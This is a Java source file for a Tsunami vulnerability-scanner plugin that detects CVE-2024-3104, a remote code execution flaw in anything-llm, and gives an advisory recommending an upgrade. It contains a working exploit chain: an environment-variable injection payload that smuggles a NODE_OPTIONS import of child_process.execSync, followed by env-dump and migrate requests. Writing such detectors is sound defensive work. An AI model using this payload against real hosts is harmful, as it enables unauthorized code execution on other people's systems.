/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.detectors.cves.cve20243104;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
import static com.google.tsunami.common.net.http.HttpRequest.get;
import static com.google.tsunami.common.net.http.HttpRequest.post;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.ForWebService;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects the CVE-2024-3104 vulnerability. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "CVE-2024-3104 Detector",
    version = "0.1",
    description = "Checks for occurrences of CVE-2024-3104 in the anything-llm instances.",
    author = "frkngksl",
    bootstrapModule = Cve20243104DetectorBootstrapModule.class)
@ForWebService
public final class Cve20243104VulnDetector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final PayloadGenerator payloadGenerator;

  private static final String PAYLOAD_BODY =
      "{\"LocalAiBasePath\":\"http://example.com/v1'\\n"
          + "NODE_OPTIONS='--import=\\\"data:text/javascript,import exec from"
          + " \\\\\\\"node:child_process\\\\\\\";exec.execSync(\\\\\\\"{{CALLBACK_PAYLOAD}}\\\\\\\")\\\"\"}";

  private static final String VUL_PATH_STEP_1 = "api/system/update-env";
  private static final String VUL_PATH_STEP_2 = "api/env-dump";
  private static final String VUL_PATH_STEP_3 = "api/migrate";

  private static final Duration BATCH_REQUEST_WAIT_AFTER_TIMEOUT = Duration.ofSeconds(5);
  private final HttpClient httpClient;

  @Inject
  Cve20243104VulnDetector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient =
        checkNotNull(httpClient, "HttpClient cannot be null.")
            .modify()
            .setFollowRedirects(false)
            .build();
    this.payloadGenerator = checkNotNull(payloadGenerator, "PayloadGenerator cannot be null.");
  }

  @Override
  public ImmutableList<Vulnerability> getAdvisories() {
    return ImmutableList.of(
        Vulnerability.newBuilder()
            .setMainId(
                VulnerabilityId.newBuilder()
                    .setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("CVE_2024_3104"))
            .addRelatedId(
                VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2024-3104"))
            .setSeverity(Severity.CRITICAL)
            .setTitle("CVE-2024-3104 anything-llm RCE")
            .setDescription(
                "A remote code execution vulnerability exists in mintplex-labs/anything-llm due"
                    + " to improper handling of environment variables. Attackers can exploit"
                    + " this vulnerability by injecting arbitrary environment variables via the"
                    + " POST /api/system/update-env endpoint, which allows for the execution of"
                    + " arbitrary code on the host running anything-llm.Successful exploitation"
                    + " could lead to code execution on the host, enabling attackers to read"
                    + " and modify data accessible to the user running the service, potentially"
                    + " leading to a denial of service.")
            .setRecommendation(
                "You can upgrade your anything-llm instances to a version whose commit ID is"
                    + " bfedfebfab032e6f4d5a369c8a2f947c5d0c5286 or later.")
            .build());
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isWebServiceOrUnknownService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean checkNeuralSolutionFingerprint(NetworkService networkService) {
    String targetWebAddress = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    var request = HttpRequest.get(targetWebAddress).withEmptyHeaders().build();

    try {
      HttpResponse response = httpClient.send(request, networkService);
      return response.status().isSuccess()
          && response
              .bodyString()
              .map(
                  body ->
                      body.contains(
                          "<title>AnythingLLM | Your personal LLM trained on anything</title>"))
              .orElse(false);
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
  }

  private boolean isWebServiceOrUnknownService(NetworkService networkService) {
    return NetworkServiceUtils.isWebService(networkService)
        && checkNeuralSolutionFingerprint(networkService);
  }

  private boolean sendFirstStepRequest(NetworkService networkService, Payload payload) {
    String targetVulnerabilityUrl =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + VUL_PATH_STEP_1;
    String requestBody = PAYLOAD_BODY.replace("{{CALLBACK_PAYLOAD}}", payload.getPayload());
    try {
      HttpResponse httpResponse =
          httpClient.send(
              post(targetVulnerabilityUrl)
                  .setHeaders(
                      HttpHeaders.builder()
                          .addHeader(CONTENT_TYPE, "text/plain;charset=UTF-8")
                          .build())
                  .setRequestBody(ByteString.copyFromUtf8(requestBody))
                  .build(),
              networkService);
      logger.atInfo().log("First Step Response: %s", httpResponse.bodyString().get());
      Uninterruptibles.sleepUninterruptibly(BATCH_REQUEST_WAIT_AFTER_TIMEOUT);
      return httpResponse.status().isSuccess()
          && httpResponse.bodyString().map(body -> body.contains("\"error\":false")).orElse(false);

    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
  }

  private boolean sendSecondStepRequest(NetworkService networkService) {
    String targetVulnerabilityUrl =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + VUL_PATH_STEP_2;

    try {
      HttpResponse httpResponse =
          httpClient.send(get(targetVulnerabilityUrl).withEmptyHeaders().build(), networkService);
      logger.atInfo().log("Second Step Response: %s", httpResponse.bodyString().get());
      return httpResponse.status().isSuccess()
          && httpResponse.bodyString().map(body -> body.matches("OK")).orElse(false);

    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
  }

  private boolean sendThirdStepRequest(NetworkService networkService) {
    String targetVulnerabilityUrl =
        NetworkServiceUtils.buildWebApplicationRootUrl(networkService) + VUL_PATH_STEP_3;
    try {
      HttpResponse httpResponse =
          httpClient.send(get(targetVulnerabilityUrl).withEmptyHeaders().build(), networkService);
      logger.atInfo().log("Third Step Response: %s", httpResponse.bodyString().get());
      return httpResponse.status().isSuccess()
          && httpResponse.bodyString().map(body -> body.matches("OK")).orElse(false);

    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    Payload payload = generateCallbackServerPayload();
    // Check callback server is enabled
    if (!payload.getPayloadAttributes().getUsesCallbackServer()) {
      logger.atInfo().log(
          "The Tsunami callback server is not setup for this environment, so we cannot confirm the"
              + " RCE callback");
      return false;
    }
    logger.atInfo().log("Callback server is available!");
    if (sendFirstStepRequest(networkService, payload)
        && sendSecondStepRequest(networkService)
        && sendThirdStepRequest(networkService)) {
      Uninterruptibles.sleepUninterruptibly(BATCH_REQUEST_WAIT_AFTER_TIMEOUT);
      return payload.checkIfExecuted();
    } else {
      return false;
    }
  }

  private Payload generateCallbackServerPayload() {
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();

    return this.payloadGenerator.generate(config);
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(this.getAdvisories().get(0))
        .build();
  }
}
